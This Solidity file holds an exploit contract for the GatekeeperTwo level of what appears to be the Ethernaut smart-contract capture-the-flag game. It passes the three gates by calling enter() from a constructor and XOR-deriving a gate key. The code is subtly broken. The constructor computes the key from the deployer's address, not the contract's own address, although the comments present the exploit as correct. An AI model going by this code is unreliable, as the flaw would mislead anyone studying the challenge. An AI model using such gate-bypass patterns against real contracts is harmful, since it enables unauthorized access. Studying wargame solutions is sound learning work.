// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
    function entrant() external view returns (address);
}

/**
 * @title GatekeeperTwoExploit
 * @dev Contract to exploit the GatekeeperTwo challenge (level 14)
 * This contract aims to bypass the three gates in the GatekeeperTwo contract
 */
contract GatekeeperTwoExploit {
    address public owner;
    address public gatekeeperAddress;
    bool public success;
    
    /**
     * @dev Constructor automatically attempts to bypass all gates on deployment
     * @param _gatekeeperAddress Address of the GatekeeperTwo contract
     */
    constructor(address _gatekeeperAddress) {
        owner = msg.sender;
        gatekeeperAddress = _gatekeeperAddress;
        
        // We must call the enter function in the constructor because:
        // - Gate One: msg.sender != tx.origin - fulfilled by calling from a contract
        // - Gate Two: extcodesize(caller()) == 0 - fulfilled because during construction, extcodesize is 0
        
        // Generate the gate key for Gate Three
        bytes8 gateKey = generateGateKey(msg.sender);
        
        // Call the enter function
        bool result = IGatekeeperTwo(gatekeeperAddress).enter(gateKey);
        success = result;
    }
    
    /**
     * @dev Generate the correct gate key for Gate Three
     * @param _caller The address to generate the key for (contract address)
     * @return bytes8 The correct gate key
     */
    function generateGateKey(address _caller) public pure returns (bytes8) {
        // Gate Three requirement:
        // uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max
        // To solve for _gateKey:
        // uint64(_gateKey) = uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ type(uint64).max
        //
        // Note: A ^ B = C implies A ^ C = B because XOR is its own inverse
        
        // Get the hash of the caller address
        bytes8 senderHash = bytes8(keccak256(abi.encodePacked(_caller)));
        
        // XOR with type(uint64).max (all 1's) to get the key
        // Since XOR with all 1's is the bitwise NOT operation
        return bytes8(uint64(senderHash) ^ type(uint64).max);
    }
    
    /**
     * @dev Check if the exploit was successful
     * @return bool True if the exploit succeeded
     */
    function checkSuccess() external view returns (bool) {
        address entrant = IGatekeeperTwo(gatekeeperAddress).entrant();
        return entrant == owner;
    }
}
